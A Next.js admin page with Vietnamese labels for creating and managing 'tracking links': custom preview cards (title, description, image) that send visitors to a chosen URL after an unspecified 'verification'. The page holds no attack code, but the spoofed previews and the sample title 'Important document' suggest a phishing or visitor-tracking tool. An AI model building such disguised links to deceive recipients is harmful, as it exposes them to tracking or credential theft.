
"use client"

import * as React from "react"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import * as z from "zod"

import { SidebarProvider, SidebarInset, SidebarTrigger } from "@/components/ui/sidebar"
import { AppSidebar } from "@/components/layout/app-sidebar"
import { Button } from "@/components/ui/button"
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogFooter,
} from "@/components/ui/dialog"
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { useToast } from "@/hooks/use-toast"
import { getLinksAction, createLinkAction, deleteLinkAction, type Link } from "@/app/actions/links"
import { PlusCircle, Copy, Eye, Trash2, Link as LinkIcon, RefreshCw } from "lucide-react"

const formSchema = z.object({
  title: z.string().min(1, "Tiêu đề là bắt buộc."),
  description: z.string().min(1, "Mô tả là bắt buộc."),
  imageUrl: z.string().url("Phải là một URL hình ảnh hợp lệ."),
  redirectUrl: z.string().url("Phải là một URL chuyển hướng hợp lệ."),
})

export default function LinksPage() {
  const { toast } = useToast()
  const [links, setLinks] = React.useState<Link[]>([])
  const [isLoading, setIsLoading] = React.useState(true)
  const [isModalOpen, setIsModalOpen] = React.useState(false)

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      title: "",
      description: "",
      imageUrl: "",
      redirectUrl: "",
    },
  })

  const fetchLinks = React.useCallback(async () => {
    setIsLoading(true)
    try {
      const linksData = await getLinksAction()
      setLinks(linksData)
    } catch (error) {
      toast({ variant: "destructive", title: "Lỗi", description: "Không thể tải danh sách links." })
    }
    setIsLoading(false)
  }, [toast])

  React.useEffect(() => {
    fetchLinks()
  }, [fetchLinks])

  async function onSubmit(values: z.infer<typeof formSchema>) {
    const result = await createLinkAction(values)
    if (result.success && result.link) {
      toast({
        title: "Thành công",
        description: "Link đã được tạo thành công.",
      })
      const shareLink = `${window.location.origin}/preview/${result.link.id}`
      await navigator.clipboard.writeText(shareLink)
      toast({
        title: "Đã sao chép!",
        description: "Link xem trước đã được sao chép vào bộ nhớ tạm.",
      })
      setIsModalOpen(false)
      form.reset()
      await fetchLinks()
    } else {
      toast({
        variant: "destructive",
        title: "Lỗi",
        description: "Không thể tạo link.",
      })
    }
  }

  const handleCopy = (id: string) => {
    const shareLink = `${window.location.origin}/preview/${id}`
    navigator.clipboard.writeText(shareLink).then(() => {
      toast({ title: "Đã sao chép!", description: "Link đã được sao chép." })
    })
  }

  const handleTest = (id: string) => {
    const shareLink = `${window.location.origin}/preview/${id}`
    window.open(shareLink, '_blank')
  }

  const handleDelete = async (id: string) => {
    if (window.confirm("Bạn có chắc chắn muốn xóa link này không?")) {
      const result = await deleteLinkAction(id)
      if (result.success) {
        toast({
          title: "Thành công",
          description: "Link đã được xóa.",
        })
        await fetchLinks()
      } else {
        toast({
          variant: "destructive",
          title: "Lỗi",
          description: "Không thể xóa link.",
        })
      }
    }
  }

  return (
    <SidebarProvider>
      <AppSidebar />
      <SidebarInset>
        <header className="flex h-16 shrink-0 items-center justify-between gap-2 border-b px-4">
          <div className="flex items-center gap-2">
            <SidebarTrigger />
            <h1 className="text-xl font-bold font-headline">Quản lý Link</h1>
          </div>
          <div className="flex items-center gap-2">
             <Button variant="outline" size="icon" onClick={fetchLinks} disabled={isLoading}>
                <RefreshCw className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} />
             </Button>
            <Dialog open={isModalOpen} onOpenChange={setIsModalOpen}>
              <DialogTrigger asChild>
                <Button>
                  <PlusCircle className="mr-2 h-4 w-4" />
                  Tạo Link Mới
                </Button>
              </DialogTrigger>
              <DialogContent className="sm:max-w-[600px]">
                <DialogHeader>
                  <DialogTitle>Tạo Link Theo Dõi Mới</DialogTitle>
                  <DialogDescription>
                    Điền thông tin bên dưới để tạo link xem trước (OG) và trang đích.
                  </DialogDescription>
                </DialogHeader>
                <Form {...form}>
                  <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                    <FormField control={form.control} name="title" render={({ field }) => (
                      <FormItem>
                        <FormLabel>Tiêu đề</FormLabel>
                        <FormControl><Input placeholder="VD: Tài liệu quan trọng" {...field} /></FormControl>
                        <FormMessage />
                      </FormItem>
                    )} />
                    <FormField control={form.control} name="description" render={({ field }) => (
                      <FormItem>
                        <FormLabel>Mô tả</FormLabel>
                        <FormControl><Textarea placeholder="VD: Mô tả ngắn gọn về tài liệu của bạn." {...field} /></FormControl>
                        <FormMessage />
                      </FormItem>
                    )} />
                    <FormField control={form.control} name="imageUrl" render={({ field }) => (
                      <FormItem>
                        <FormLabel>URL Hình ảnh</FormLabel>
                        <FormControl><Input placeholder="https://..." {...field} /></FormControl>
                        <FormMessage />
                      </FormItem>
                    )} />
                    <FormField control={form.control} name="redirectUrl" render={({ field }) => (
                      <FormItem>
                        <FormLabel>URL Chuyển hướng</FormLabel>
                        <FormControl><Input placeholder="https://..." {...field} /></FormControl>
                        <FormDescription>Người dùng sẽ được chuyển đến URL này sau khi xác minh.</FormDescription>
                        <FormMessage />
                      </FormItem>
                    )} />
                    <DialogFooter>
                      <Button type="button" variant="secondary" onClick={() => setIsModalOpen(false)}>Hủy</Button>
                      <Button type="submit" disabled={form.formState.isSubmitting}>
                        {form.formState.isSubmitting ? "Đang tạo..." : "Tạo & Sao chép Link"}
                      </Button>
                    </DialogFooter>
                  </form>
                </Form>
              </DialogContent>
            </Dialog>
          </div>
        </header>
        <main className="flex-1 p-6">
          <div className="rounded-lg border bg-card text-card-foreground shadow-sm">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead className="w-[40%]">Tiêu đề / Mô tả</TableHead>
                  <TableHead>URL Chuyển hướng</TableHead>
                  <TableHead className="text-right w-[200px]">Hành động</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {isLoading ? (
                  <TableRow><TableCell colSpan={3} className="text-center h-24">Đang tải...</TableCell></TableRow>
                ) : links.length > 0 ? (
                  links.map((link) => (
                    <TableRow key={link.id}>
                      <TableCell>
                        <div className="font-medium">{link.title}</div>
                        <div className="text-xs text-muted-foreground truncate">{link.description}</div>
                      </TableCell>
                      <TableCell>
                        <a href={link.redirectUrl} target="_blank" rel="noopener noreferrer" className="text-xs text-muted-foreground hover:text-primary truncate">{link.redirectUrl}</a>
                      </TableCell>
                      <TableCell className="text-right space-x-1">
                        <Button variant="ghost" size="icon" onClick={() => handleCopy(link.id)}><Copy className="h-4 w-4" /></Button>
                        <Button variant="ghost" size="icon" onClick={() => handleTest(link.id)}><Eye className="h-4 w-4" /></Button>
                        <Button variant="ghost" size="icon" onClick={() => handleDelete(link.id)} className="text-destructive hover:text-destructive"><Trash2 className="h-4 w-4" /></Button>
                      </TableCell>
                    </TableRow>
                  ))
                ) : (
                  <TableRow>
                    <TableCell colSpan={3} className="h-48 text-center">
                      <div className="flex flex-col items-center gap-4">
                        <LinkIcon className="h-12 w-12 text-muted-foreground/30"/>
                        <p className="text-muted-foreground">Chưa có link nào được tạo.</p>
                        <DialogTrigger asChild>
                            <Button variant="outline">Bắt đầu bằng cách tạo link đầu tiên</Button>
                        </DialogTrigger>
                      </div>
                    </TableCell>
                  </TableRow>
                )}
              </TableBody>
            </Table>
          </div>
        </main>
      </SidebarInset>
    </SidebarProvider>
  )
}
